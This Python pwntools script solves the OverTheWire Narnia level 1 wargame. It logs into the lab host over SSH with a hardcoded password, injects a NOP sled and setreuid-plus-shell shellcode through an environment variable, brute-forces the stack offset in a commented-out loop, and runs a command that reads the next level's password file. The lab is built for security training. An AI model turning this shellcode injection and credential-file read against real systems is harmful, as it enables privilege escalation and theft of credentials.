#! /usr/bin/env python3
import pwn

s = pwn.ssh('narnia1', 
            'narnia.labs.overthewire.org', 
            password='efeidiedae',
            port=2226)

NopeSled = b'\x90'*4096
ShellCode = pwn.asm(
            pwn.shellcraft.i386.linux.setreuid(14002) + 
            pwn.shellcraft.i386.linux.sh()
)

""" Finding Offset """
"""
for i in range(-300,5):
    try:
        p = s.process('/narnia/narnia1',
                      env={'EGG': pwn.p32(0xffffcb38+2048*i) + NopeSled + ShellCode  })
        print (p.recvline())
        print (p.recvline())
        print (p.recvline())
        print (p.recvline())
        print (p.recvline())
        print (p.recvline())
    except EOFError:
        print (i)
"""

p = s.process('/narnia/narnia1',
              env={'EGG': pwn.p32(0xffffcb38-2048*250) + NopeSled + ShellCode  })
p.sendline('cat /etc/narnia_pass/narnia2')
p.recvuntil('Trying to execute EGG!\n')
print (p.recvline())
p.close()
s.close()
